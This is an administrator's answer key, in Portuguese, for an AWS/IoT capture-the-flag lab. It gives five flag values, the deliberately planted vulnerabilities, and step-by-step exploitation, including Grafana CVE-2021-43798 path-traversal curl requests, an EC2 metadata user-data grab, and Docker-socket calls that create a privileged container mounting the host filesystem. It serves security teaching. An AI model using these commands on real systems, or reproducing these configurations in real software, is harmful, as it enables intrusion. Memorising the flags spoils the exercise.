# Guia de Vulnerabilidades — Admin

> ⚠️ **DOCUMENTO RESTRITO AO ADMINISTRADOR** — Não compartilhar com jogadores.
>
> Este documento detalha tecnicamente cada uma das 5 flags, sua localização exata no código,
> como explorá-las e o objetivo educacional de cada uma.

---

## Visão Geral das Flags

| Flag | Vulnerabilidade | Arquivo/Local | Dificuldade |
|------|----------------|---------------|-------------|
| 1 | Credenciais no código-fonte do frontend | `frontend/src/config.js` | 1/10 |
| 2 | Credenciais no User Data da EC2 | `infrastructure/vm3-ctf/user-data.sh` | 3/10 |
| 3 | ACL permissiva no broker MQTT | `infrastructure/vm2-broker/mosquitto/acl.conf` | 6/10 |
| 4 | Path Traversal em Grafana desatualizado | Container `grafana:8.3.0` (CVE-2021-43798) | 7/10 |
| 5 | Privilege Escalation + Container Escape via SUID | Container `grafana` + Docker socket | 9.5/10 |

---

## Flag 1 — Credenciais no Código-Fonte do Frontend

**Valor da Flag**: `FLAG{Fr0nt3nd_S0urc3_C0d3_1s_N0t_S3cur3}`

**Localização**: `frontend/src/config.js`

```javascript
// frontend/src/config.js
// ATENÇÃO: Este comentário foi "esquecido" pelo desenvolvedor durante o debug.
// ssh_debug_user: "ctf-player"
// ssh_debug_pass: "S3nh4_D3_D3bug_Temp0r4ria!"
// FLAG: FLAG{Fr0nt3nd_S0urc3_C0d3_1s_N0t_S3cur3}
```

**Descrição da Vulnerabilidade**:
Um desenvolvedor deixou credenciais SSH temporárias comentadas no arquivo de configuração do frontend React. Como o React compila para JavaScript estático servido via S3/CloudFront, qualquer pessoa pode inspecionar o código-fonte no navegador (F12 → Sources) e encontrar essas credenciais.

**Como Explorar**:
1. Acessar o portal do CTF no navegador.
2. Pressionar `F12` para abrir o DevTools.
3. Ir em `Sources` → navegar pelos arquivos JS compilados (geralmente em `static/js/`).
4. Buscar por `FLAG`, `pass`, `secret`, `ssh` ou `debug` nos arquivos.
5. Encontrar as credenciais e a flag no arquivo `config.js` compilado.

**Objetivo Educacional**:
- Nunca comitar segredos em código-fonte, mesmo como comentários.
- Segredos em frontends JS são 100% públicos após o build.
- Usar variáveis de ambiente de build (`REACT_APP_*`) e nunca expor credenciais reais no cliente.
- Ferramentas como `git-secrets`, `truffleHog` e `gitleaks` previnem esse tipo de vazamento.

---

## Flag 2 — Credenciais no User Data da EC2

**Valor da Flag**: `FLAG{M3t4d4t4_S3rv1c3_3xp0s3s_S3cr3ts}`

**Localização**: `infrastructure/vm3-ctf/user-data.sh`

O script de User Data contém as credenciais do usuário administrador do Mosquitto:

```bash
# infrastructure/vm3-ctf/user-data.sh (trecho)
# Credenciais do broker MQTT para o Telegraf
export MQTT_ADMIN_USER="mqtt_admin"
export MQTT_ADMIN_PASS="Br0k3r_4dm1n_P4ss!"
# FLAG: FLAG{M3t4d4t4_S3rv1c3_3xp0s3s_S3cr3ts}
```

**Descrição da Vulnerabilidade**:
O script de inicialização da EC2 (User Data) contém credenciais em texto claro. O User Data é acessível a partir de **dentro da instância** via o serviço de metadados da AWS, sem autenticação.

**Como Explorar**:
1. Após ganhar acesso à VM3 (via Flag 1 — as credenciais SSH levam à VM3).
2. De dentro da VM3, executar:
   ```bash
   curl http://169.254.169.254/latest/user-data
   ```
3. O User Data completo é retornado, incluindo as credenciais do MQTT admin.

> **Nota Técnica**: A AWS lançou o IMDSv2 para mitigar esse tipo de ataque, exigindo um token de sessão antes de acessar o metadado. Neste CTF, a VM3 usa IMDSv1 (sem token) para manter a vulnerabilidade explorável.

**Objetivo Educacional**:
- Nunca colocar segredos em User Data de EC2.
- Usar **AWS Secrets Manager** ou **AWS Parameter Store** para gerenciar segredos.
- Habilitar **IMDSv2** em todas as instâncias EC2 para dificultar o acesso não autorizado ao serviço de metadados.
- O SSRF combinado com o serviço de metadados é um vetor de ataque clássico em ambientes cloud.

---

## Flag 3 — ACL Permissiva no Broker MQTT

**Valor da Flag**: `FLAG{ACL_W1ldC4rd_1_C4n_H34r_3v3ryth1ng}`

**Localização**: `infrastructure/vm2-broker/mosquitto/acl.conf`

```ini
# infrastructure/vm2-broker/mosquitto/acl.conf

# Regra CORRETA para sensor01 (apenas publicar nos próprios tópicos)
# user sensor01
# topic write fabrica/sensor01/#

# Regra VULNERÁVEL (permite ler TODOS os tópicos da fábrica)
user sensor01
topic readwrite fabrica/#    # ← ACL mal configurada: deveria ser apenas 'write fabrica/sensor01/#'

# Tópico de gerenciamento onde a flag é publicada periodicamente
# (apenas mqtt_admin deveria ler, mas a wildcard permite que sensor01 leia também)
user mqtt_admin
topic readwrite fabrica/#
topic readwrite sistema/gerenciamento/#
```

**Descrição da Vulnerabilidade**:
A ACL do Mosquitto concede ao usuário `sensor01` permissão de leitura (`readwrite`) em todos os tópicos abaixo de `fabrica/#`. Um script interno do admin publica a flag periodicamente no tópico `fabrica/sistema/flag`, que deveria ser acessível apenas ao `mqtt_admin`.

**Script que publica a flag** (roda como cronjob na VM2):
```bash
# /opt/ctf/publish_flag.sh (roda a cada 60 segundos via cron na VM2)
mosquitto_pub -h localhost -u mqtt_admin -P "Br0k3r_4dm1n_P4ss!" \
  -t "fabrica/sistema/flag" \
  -m "FLAG{ACL_W1ldC4rd_1_C4n_H34r_3v3ryth1ng}" -r
```

**Como Explorar**:
1. Com as credenciais do `mqtt_admin` obtidas na Flag 2, conectar ao broker:
   ```bash
   # Instalar cliente MQTT
   apt-get install mosquitto-clients
   
   # Inscrever-se no wildcard com as credenciais do sensor01
   # (as credenciais do sensor01 são encontradas no código-fonte do sensor.py)
   mosquitto_sub -h <VM2_IP> -p 1883 -u sensor01 -P "S3ns0r01_P4ss!" \
     -t "fabrica/#" -v
   ```
2. Aguardar até 60 segundos para a flag aparecer no tópico `fabrica/sistema/flag`.

**Objetivo Educacional**:
- ACLs em brokers MQTT devem seguir o princípio do menor privilégio.
- `readwrite` vs `write` vs `read` — a diferença importa criticamente.
- Wildcards (`#`, `+`) em ACLs devem ser usados com extremo cuidado.
- Tópicos de gerenciamento e sensores devem ser segregados em namespaces distintos.

---

## Flag 4 — Path Traversal em Container Grafana Desatualizado

**Valor da Flag**: `FLAG{Gr4f4n4_CVE_2021_43798_P4th_Tr4v3rs4l}`

**Localização**: Container `grafana:8.3.0` na VM3

**CVE**: [CVE-2021-43798](https://nvd.nist.gov/vuln/detail/CVE-2021-43798) — Grafana Path Traversal (CVSS 7.5 HIGH)

**Descrição da Vulnerabilidade**:
O Grafana versão 8.3.0 e anteriores possui uma vulnerabilidade de Path Traversal no endpoint de plugins. Um atacante pode ler arquivos arbitrários do sistema de arquivos do container sem autenticação, manipulando o parâmetro de URL.

**Arquivo que contém a flag**:
```
/var/lib/grafana/flag4.txt
```

Conteúdo: `FLAG{Gr4f4n4_CVE_2021_43798_P4th_Tr4v3rs4l}`

**Como Explorar**:
1. Identificar a versão do Grafana (visível na página de login: `http://<VM3_IP>:80`).
2. Pesquisar CVE para Grafana 8.3.0 → encontrar CVE-2021-43798.
3. Executar o exploit de Path Traversal:
   ```bash
   # Leitura de arquivo arbitrário via Path Traversal
   curl --path-as-is "http://<VM3_IP>:80/public/plugins/alertlist/../../../../../../../../../var/lib/grafana/flag4.txt"
   ```
4. A resposta conterá a flag.

**Variações do exploit**:
```bash
# Também funciona para ler outros arquivos sensíveis do container
curl --path-as-is "http://<VM3_IP>:80/public/plugins/text/../../../../../../../../../etc/passwd"
curl --path-as-is "http://<VM3_IP>:80/public/plugins/graph/../../../../../../../../../etc/grafana/grafana.ini"
```

**Objetivo Educacional**:
- Manter imagens Docker atualizadas é crítico — versões antigas têm CVEs conhecidas.
- Ferramentas como `Trivy`, `Snyk` e `Docker Scout` escaneiam imagens por vulnerabilidades.
- Path Traversal é uma das vulnerabilidades mais antigas e ainda muito prevalente (OWASP Top 10 A01).
- Containers não são um sandbox de segurança — vulnerabilidades da aplicação ainda existem dentro deles.

---

## Flag 5 — Privilege Escalation + Container Escape via SUID

**Valor da Flag**: `FLAG{SU1D_D0ck3r_S0ck3t_C0nt41n3r_3sc4p3_GG}`

**Localização**: Container `grafana` na VM3 (requer acesso ao shell do container)

**Descrição da Vulnerabilidade**:
O container do Grafana foi configurado com dois problemas críticos:
1. Um binário SUID (`/usr/bin/ctf-helper`) que permite escalar para `root` dentro do container.
2. O socket do Docker (`/var/run/docker.sock`) está montado dentro do container.

Com acesso `root` no container + socket do Docker, o jogador pode criar um novo container montando o sistema de arquivos do host e "escapar" do isolamento.

**Configuração vulnerável no `docker-compose.yml`**:
```yaml
grafana:
  image: grafana/grafana:8.3.0
  volumes:
    - /var/run/docker.sock:/var/run/docker.sock  # ← VULNERABILIDADE
    - grafana_data:/var/lib/grafana
  # O binário SUID é adicionado no Dockerfile customizado
```

**Binário SUID** (adicionado no Dockerfile da Grafana):
```dockerfile
# infrastructure/vm3-ctf/grafana/Dockerfile
FROM grafana/grafana:8.3.0
USER root
# Copia um binário helper com bit SUID setado
COPY ctf-helper /usr/bin/ctf-helper
RUN chmod u+s /usr/bin/ctf-helper && chown root:root /usr/bin/ctf-helper
USER grafana
```

**Como Explorar (passo a passo)**:
```bash
# Passo 1: Obter RCE no container via Path Traversal (Flag 4) + credenciais do Grafana
# As credenciais padrão admin:admin estão ativas (outra má prática!)
curl -X POST "http://<VM3_IP>:80/api/ds/query" \
  -H "Content-Type: application/json" \
  -u admin:admin \
  --data '...'  # payload para RCE via datasource malicioso

# Passo 2: Dentro do container, encontrar o binário SUID
find / -perm -u=s -type f 2>/dev/null
# Resultado: /usr/bin/ctf-helper

# Passo 3: Usar o ctf-helper para escalar para root
/usr/bin/ctf-helper
# Agora somos root dentro do container

# Passo 4: Interagir com o Docker socket para montar o host
# Listar imagens disponíveis via API do socket
curl --unix-socket /var/run/docker.sock http://localhost/images/json

# Passo 5: Criar container privilegiado com o filesystem do host montado
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "influxdb:1.8",
    "Cmd": ["cat", "/host/root/flag5.txt"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }'

# Passo 6: Iniciar o container e ler os logs com a flag
curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/<CONTAINER_ID>/start"

curl --unix-socket /var/run/docker.sock \
  "http://localhost/containers/<CONTAINER_ID>/logs?stdout=1"
# Resultado: FLAG{SU1D_D0ck3r_S0ck3t_C0nt41n3r_3sc4p3_GG}
```

**Arquivo com a flag no host da VM3**:
```
/root/flag5.txt
```

**Objetivo Educacional**:
- **Nunca** montar o socket do Docker dentro de um container em produção.
- Binários SUID devem ser auditados regularmente (`find / -perm -u=s -type f`).
- Usar **Seccomp profiles** e **AppArmor** para restringir o que processos dentro de containers podem fazer.
- **rootless Docker** e **Podman** são alternativas mais seguras.
- O Docker socket é equivalente a acesso root no host.

---

## Script de Publicação das Flags (VM2)

Adicionar ao crontab da VM2:
```bash
# /etc/cron.d/ctf-flags
* * * * * root /opt/ctf/publish_flag.sh >> /var/log/ctf-flags.log 2>&1
```

```bash
#!/bin/bash
# /opt/ctf/publish_flag.sh
mosquitto_pub \
  -h localhost \
  -u mqtt_admin \
  -P "Br0k3r_4dm1n_P4ss!" \
  -t "fabrica/sistema/flag" \
  -m "FLAG{ACL_W1ldC4rd_1_C4n_H34r_3v3ryth1ng}" \
  -r  # retained: nova conexão já recebe a mensagem imediatamente
```
